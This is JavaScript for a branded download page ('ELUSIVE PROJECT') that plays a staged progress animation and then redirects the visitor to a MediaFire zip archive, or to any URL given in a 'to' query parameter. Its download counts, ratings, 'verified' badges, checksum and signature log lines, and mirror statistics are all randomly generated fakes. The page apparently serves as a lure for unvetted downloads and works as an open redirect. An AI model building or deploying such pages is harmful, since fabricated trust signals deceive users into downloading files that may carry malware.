const CONFIG = {
    brandName: "ELUSIVE PROJECT",
    brandTagline: "verified • secured • ready",
    defaultRedirect: "https://www.mediafire.com/file_premium/johlcipzpfk09vr/Elusive_Software_2.4.1.zip/file",
    minLoadMs: 6500,
    maxLoadMs: 9500,
    accelerateNearEnd: true
};

const $ = (id) => document.getElementById(id);
const rand = (a, b) => Math.floor(a + Math.random() * (b - a + 1));
const clamp = (v, a, b) => Math.max(a, Math.min(b, v));

const params = new URLSearchParams(location.search);
const toParam = params.get("to");
const targetUrl = (toParam && safeUrl(toParam)) ? decodeURIComponent(toParam) : CONFIG.defaultRedirect;

function safeUrl(u) {
    try {
        const decoded = decodeURIComponent(u);
        const url = new URL(decoded);
        return (url.protocol === "http:" || url.protocol === "https:");
    } catch (e) {
        return false;
    }
}

$("brandName").textContent = CONFIG.brandName;
$("brandTagline").textContent = CONFIG.brandTagline;

$("buildId").textContent = "r-" + rand(1400, 9800) + "." + rand(1, 99);
$("sessionId").textContent = cryptoRandomId(10);

function cryptoRandomId(len) {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    let out = "";
    const bytes = new Uint8Array(len);
    (crypto || window.msCrypto).getRandomValues(bytes);
    for (let i = 0; i < len; i++) out += chars[bytes[i] % chars.length];
    return out;
}

let downloads = rand(112000, 120000); //скачиваний щас стоит от 180000 до  1400000
let online = rand(180, 1400); //онлайн
let rating = (Math.random() * 0.35 + 4.55); //рейтинг 
let queue = rand(2, 100); //Queue status

$("mDownloads").textContent = formatInt(downloads);
$("mOnline").textContent = formatInt(online);
$("mRating").textContent = rating.toFixed(1);
$("mQueue").textContent = queue + " active";

$("mOnlineHint").textContent = (Math.random() > 0.5) ? "stable" : "peak";
$("mRatingHint").textContent = "verified";
$("ringText").textContent = "checksum • policy • mirror";

const mirrors = ["auto", "eu-1", "eu-2", "edge"];
$("chipMirror").textContent = mirrors[rand(0, mirrors.length - 1)];
$("chipLatency").textContent = rand(18, 68) + "ms";
$("chipRoute").textContent = "gw-" + rand(1, 9) + "/edge";

$("manualLink").textContent = shortUrl(targetUrl);

function formatInt(n) {
    return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}

function shortUrl(url) {
    try {
        const u = new URL(url);
        const p = u.pathname.length > 18 ? (u.pathname.slice(0, 18) + "…") : u.pathname;
        return u.host + p;
    } catch (e) {
        return url;
    }
}

setInterval(() => {
    downloads += rand(0, 8);
    online = clamp(online + rand(-4, 9), 80, 3600);
    queue = clamp(queue + rand(-1, 2), 0, 38);

    $("mDownloads").textContent = formatInt(downloads);
    $("mOnline").textContent = formatInt(online);
    $("mQueue").textContent = queue + " active";
}, 900);

const term = $("termBody");
const logPool = [
    ["OK", "handshake established"],
    ["OK", "env fingerprint matched"],
    ["OK", "mirror list fetched"],
    ["W", "latency spike detected"],
    ["OK", "routing normalized"],
    ["OK", "manifest verified"],
    ["OK", "signature valid"],
    ["OK", "policy pass"],
    ["OK", "preparing handoff"],
    ["OK", "redirect channel ready"]
];

function ts() {
    const d = new Date(Date.now());
    const mm = String(d.getMinutes()).padStart(2, "0");
    const ss = String(d.getSeconds()).padStart(2, "0");
    return mm + ":" + ss;
}

function addLine(level, msg) {
    const lvlClass = level === "OK" ? "ok" : (level === "W" ? "w" : "e");
    const row = document.createElement("div");
    row.className = "line";
    row.innerHTML =
        `<span class="ts">${ts()}</span>` +
        `<span class="lvl ${lvlClass}">${level}</span>` +
        `<span class="msg">${msg}</span>`;
    term.appendChild(row);
    while (term.children.length > 12) term.removeChild(term.firstChild);
    term.scrollTop = term.scrollHeight;
}

addLine("OK", "boot sequence");
addLine("OK", "collecting session context");

const stages = [{
    p: 6,
    t: "initializing",
    log: ["OK", "boot ok"]
}, {
    p: 18,
    t: "checking env",
    log: ["OK", "env ok"]
}, {
    p: 34,
    t: "selecting mirror",
    log: ["OK", "mirror selected"]
}, {
    p: 52,
    t: "validating payload",
    log: ["OK", "payload verified"]
}, {
    p: 70,
    t: "verifying policy",
    log: ["OK", "policy pass"]
}, {
    p: 86,
    t: "finalizing",
    log: ["OK", "handoff prepared"]
}, {
    p: 96,
    t: "preparing redirect",
    log: ["OK", "channel ready"]
}];

const totalMs = rand(CONFIG.minLoadMs, CONFIG.maxLoadMs);
let start = performance.now();
let lastP = 0;
let lastStageIndex = -1;

function tick(now) {
    const elapsed = now - start;
    let t = clamp(elapsed / totalMs, 0, 1);

    let eased = (t < 0.5) ?
        4 * t * t * t :
        1 - Math.pow(-2 * t + 2, 3) / 2;

    if (CONFIG.accelerateNearEnd && t > 0.80) {
        const k = (t - 0.80) / 0.20;
        eased = clamp(eased + k * 0.08, 0, 1);
    }

    let p = Math.floor(eased * 100);
    p = Math.max(p, lastP);
    lastP = p;

    $("pct").textContent = p;
    $("fill").style.width = p + "%";

    const stageIndex = pickStageIndex(p);
    if (stageIndex !== lastStageIndex) {
        lastStageIndex = stageIndex;
        const st = stages[stageIndex] || stages[0];
        $("stageText").textContent = st.t;

        if (p > 40) $("f1").textContent = "ready";
        if (p > 62) $("f2").textContent = "ready";
        if (p > 78) $("f3").textContent = "ready";

        const [lvl, msg] = st.log;
        addLine(lvl, msg);

        if (Math.random() > 0.65) {
            const [L, M] = logPool[rand(0, logPool.length - 1)];
            addLine(L, M);
        }
    }

    if (p >= 100 || t >= 1) {
        finalizeAndRedirect();
        return;
    }
    requestAnimationFrame(tick);
}

function pickStageIndex(p) {
    for (let i = stages.length - 1; i >= 0; i--) {
        if (p >= stages[i].p) return i;
    }
    return 0;
}

function finalizeAndRedirect() {
    $("stageText").textContent = "redirecting";
    $("liveStatus").textContent = "handoff";
    $("termHint").textContent = "final";
    addLine("OK", "redirect now");

    setTimeout(() => location.replace(targetUrl), rand(180, 360));
}

requestAnimationFrame(tick);